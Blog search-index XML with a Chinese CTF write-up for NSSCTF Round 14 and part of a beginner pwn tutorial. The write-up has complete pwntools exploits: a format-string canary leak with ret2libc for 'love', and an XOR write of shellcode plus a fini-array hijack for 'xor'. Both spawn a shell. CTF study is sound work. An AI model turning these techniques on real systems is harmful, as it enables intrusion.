<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSSround14wp</title>
      <link href="/NSSround14wp/"/>
      <url>/NSSround14wp/</url>
      
        <content type="html"><![CDATA[<p>本次round14只打了一题，（没报零真是太好了），赛后在@摸鱼の猫 师傅的指点下又解决了一题</p><img src="/NSSround14wp/nssround14.png" alt="round14" style="zoom:50%;"><p><strong>也许是目录</strong></p><ul><li>love</li><li>xor</li></ul><span id="more"></span><h1 id="Love"><a href="#Love" class="headerlink" title="Love"></a>Love</h1><p><em><strong>PS: 做题都能看到Toka，我直接狂喜-ing</strong></em></p><p>👉 <a href="../resources/pwn_asset/NSS_round14/love.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/loveMain.png" alt="loveMain" style="zoom:75%;"><p>发现main又格式化漏洞，程序开了canary保护</p><p>所以思路就是：<strong>利用printf改写v4使其等于v5，并且泄露canary</strong></p><img src="/NSSround14wp/lovevuln.png" alt="lovevuln" style="zoom:75%;"><p>然后进入vuln函数就是一个简单的溢出</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28037</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x4013f3</span></span><br><span class="line">r()</span><br><span class="line">payload = <span class="string">b&#x27;%520c%9$n.%15$p&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">res = r().split(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(res[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40125d</span>)<span class="comment"># 这里记得返回到vuln，别返回到main啦，要不然又要再利用一遍printf了</span></span><br><span class="line">sl(payload)</span><br><span class="line">libc_base = get_addr() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">ru(<span class="string">b&#x27;my level\n&#x27;</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret)</span><br><span class="line">payload += p64(rdi) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sl(payload)</span><br><span class="line">i()</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>👉 <a href="../resources/pwn_asset/NSS_round14/xor.zip" target="_block">点击下载附件</a></p><img src="/NSSround14wp/xorMain.png" alt="xorMain" style="zoom:80%;"><p>flag在bss段，判断小于等于0跳出循环，xorByteWithAddress可以与任意地址数据异或，所以给高位异或一个0xFF（变成负数），基本上相当于无限循环（loop）了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后找一段rw（readable，writeable）区域写入shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0, 随便找到的，只是把个位凑个0而已</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>然后想办法触发shellcode，因为程序没有栈溢出，所以这里我们让程序自己触发。</p><p>由于在main结束后会跳转到_final_array储存的地址，这里把储存的地址改成我们写入的shellcode地址，然后再把flag高位异或一个0xff（变成0，也就是说flag变成正数，跳出循环，使main结束）</p><img src="/NSSround14wp/finalArray.png" alt="finalArray" style="zoom:80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 to 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>完整exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 &gt; 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn の学习之路</title>
      <link href="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
      <url>/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。<del>（拜托~，pwn掉系统什么的真的超帅的！）</del></p><span id="more"></span><h1 id="也许需要nc一下？！"><a href="#也许需要nc一下？！" class="headerlink" title="也许需要nc一下？！"></a>也许需要nc一下？！</h1><p>要pwn肯定要先连接服务器嘛。一般给了地址和端口可以直接用pwntools的remote连接</p><p>比如给你了 <code>114.514.19.19:810</code></p><p>pwntools远程就是<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>，</p><p>本地打就用 <code>io = process(&#39;file_path&#39;)</code></p><p>如果要在kali上就是 <code>$ nc 114.514.19.19 810</code></p><p>当然有时候可能是ssh，telnet之类的</p><p>可以自行上网搜索如何连接。</p><p>这里以ssh为例： 假设用户是ctf 那么就可以用<code>$ ssh ctf@114.514.19.19 -p 810</code>连接，然后再输入密码（没有给就自己爆吧，甚至可能不给端口2333）</p><p>不过有种偷懒的方法就是直接用xshell连接（download: <a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p><p>具体用法请自行百度</p><h1 id="这是什么？缓冲区？！溢出一下！"><a href="#这是什么？缓冲区？！溢出一下！" class="headerlink" title="这是什么？缓冲区？！溢出一下！"></a>这是什么？缓冲区？！溢出一下！</h1><p>缓冲区溢出就是长数据复制到小的缓冲区里，多出的数据会发生泄露，导致其他数据被破坏。<strong>常见的栈溢出和堆溢出都包含在内，只是发生在栈上和堆上的区别而已。</strong></p><p>而其中，栈溢出是最常见的漏洞，一般来说难度也比较小（也可以很恶心），作为pwn的起点当之无愧吧。</p><h2 id="栈の基础"><a href="#栈の基础" class="headerlink" title="栈の基础"></a>栈の基础</h2><h3 id="什么是栈？（stack）"><a href="#什么是栈？（stack）" class="headerlink" title="什么是栈？（stack）"></a>什么是栈？（stack）</h3><p>栈是一种<strong>先进后出</strong>的数据结构，这也正好满足了调用函数的方式，即：父函数调用子函数，父在前，子在后；返回值时，子函数先返回，父函数后返回。</p><p>对栈有push（压数据入栈），pop（弹出数据，并储存到指定寄存器或内存中）两种操作。</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png" alt="push&amp;pop"></p><p><strong>需要注意:</strong> </p><p>1）栈的生长是<strong>从高地址往低地址</strong>，对应上面演示的向下生长</p><p>2）<strong>pop后被弹出的数据还在栈内，但是不能直接访问（还是可以访问的）</strong></p><h3 id="什么是栈帧？（stack-frame）"><a href="#什么是栈帧？（stack-frame）" class="headerlink" title="什么是栈帧？（stack frame）"></a>什么是栈帧？（stack frame）</h3><p>其本质就是一种栈，这种栈专门来<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</strong></p><p>栈帧有栈顶和栈底之分，<strong>栈顶地址最低，栈底地址最高，SP（栈指针）是一直指向栈顶的。</strong></p><p>下面是一个栈帧示意图：</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p><p>一般来说，<code>bp</code>（基址指针）到<code>sp</code>之间的区域当作栈帧。<strong>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</strong>。</p><p>函数调用过程中，我们将调用函数的函数称为 “调用者（caller）“， 被调用的函数称为 “被调用者（callee）”。其中：</p><p>1）caller需要知道在哪里获取callee的返回值</p><p>2）callee需要知道传入的参数在哪里</p><p>3）返回地址在哪里</p><p>同时，<strong>我们要保证在callee返回后，<code>bp</code>, <code>sp</code>等寄存器的值应该和调用前一致</strong>。所以，我们要用栈来保存这些数据。</p><h2 id="bss，data，text，heap-amp-stack"><a href="#bss，data，text，heap-amp-stack" class="headerlink" title="bss，data，text，heap &amp; stack"></a>bss，data，text，heap &amp; stack</h2><h3 id="bss-segment："><a href="#bss-segment：" class="headerlink" title="bss segment："></a>bss segment：</h3><p>bss段通常用来存放程序中<strong>未初始化的全局变量</strong></p><p>bss是 Block Started by Symbol 的简称</p><p>bss段属于静态内存分配</p><h3 id="data-segment："><a href="#data-segment：" class="headerlink" title="data segment："></a>data segment：</h3><p>数据段通常存放<strong>已经初始化的全局变量</strong>，属于静态内存分配</p><h3 id="code-x2F-text-segment："><a href="#code-x2F-text-segment：" class="headerlink" title="code&#x2F;text segment："></a>code&#x2F;text segment：</h3><p>代码段通常用来存放程序执行代码，其大小在编译期确定，并且该内存区域通常为只读（某些架构允许可写，即允许修改程序）</p><h3 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h3><p>堆用于存放程序运行中被动态分配的内存段，大小不固定，可动态扩张或缩减。</p><p>当进程调用malloc等函数分配内存时，新分配的内存会被动态添加到堆上（堆被扩张）；</p><p>使用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p><strong>栈又称堆栈</strong>，是用户存放程序<strong>临时创建的局部变量</strong>，也就是 {} 中定义的变量（但<strong>不包括static声明的变量</strong>，static意味着在数据段（.data）中存放变量）。</p><p>此外，函数被调用时，其参数也会压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p><p>由于栈先进后出的特点，栈特别方便来保存&#x2F;恢复调用现场。</p><p>从这个意义上，<strong>我们可以把堆栈看成一个寄存，交换临时数据的内存区</strong>。</p><h2 id="pwntools基础"><a href="#pwntools基础" class="headerlink" title="pwntools基础"></a>pwntools基础</h2><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>使用python自带的pip下载pwntools</p><p><code>$ pip install pwntools</code></p><p>如果在windows上的wsl上直接使用改语句可能会报错</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/pip-error.png" alt="pip_err"></p><p>不过好在给了你提示，只要在后面加上<code>--break-system-packages</code>即可</p><p>也就是：<code>$ pip install pwntools --break-system-packages</code></p><h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># 导入pwntools模块</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># x64架构应为 &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span><span class="comment"># 设置为目标机的系统，一般是linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;deubg&#x27;</span><span class="comment"># 输出调试信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">或者直接使用:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">当然一般情况下arch和os不用设置（要生成shellcode时候要设置），只要设置log_level为debug就可以了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用来建立一个远程连接，url或者ip作为地址，然后指明端口</span></span><br><span class="line"><span class="string">也可以仅使用本地文件，方便调试:</span></span><br><span class="line"><span class="string">io = 